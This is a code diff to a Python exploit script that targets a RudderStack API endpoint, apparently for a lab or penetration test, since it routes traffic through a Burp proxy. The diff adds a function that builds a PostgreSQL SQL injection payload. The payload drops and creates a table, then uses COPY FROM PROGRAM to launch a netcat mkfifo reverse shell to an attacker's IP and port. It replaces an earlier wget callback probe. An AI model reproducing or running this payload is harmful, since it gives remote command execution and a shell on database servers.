@@ -13,6 +13,22 @@ import sys
 # Suppress insecure request warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+def send_postgres_revshell(lhost, lport):
+    """
+    Creates a PostgreSQL reverse shell SQLi payload for the RudderStack API
+    
+    Args:
+        lhost (str): The attacker's IP address for the reverse shell
+        lport (int): The attacker's port for the reverse shell
+    """
+  
+    # Create the reverse shell payload
+    rev_shell = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
+    
+    # Craft the SQL injection payload
+    return f"'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM '{rev_shell}'; --"
+
+
 def send_rudderstack_request(endpoint_url, source_id, proxy_url=None, task_run_id="1", direct_fallback=True, debug=False):
     """
     Send a request to RudderStack through a Burp proxy with fallback options.
@@ -110,7 +126,7 @@ def send_rudderstack_request(endpoint_url, source_id, proxy_url=None, task_run_i
                 verify=False,
                 timeout=10
             )
-            
+
             return response
             
         except requests.exceptions.ProxyError as e:
@@ -154,7 +170,7 @@ def send_rudderstack_request(endpoint_url, source_id, proxy_url=None, task_run_i
 if __name__ == "__main__":
     # Example parameters
     rudderstack_endpoint = "rudderstack:8080/v1/warehouse/pending-events?triggerUpload=true"
-    source_id = "'; copy (select 'a') to program 'wget -q http://192.168.45.195:9001/it_worked' -- -"
+    source_id = send_postgres_revshell("192.168.45.195", "4444")
     burp_proxy = "127.0.0.1:8080"  # Default Burp proxy address
     
     # Simple configuration with default values
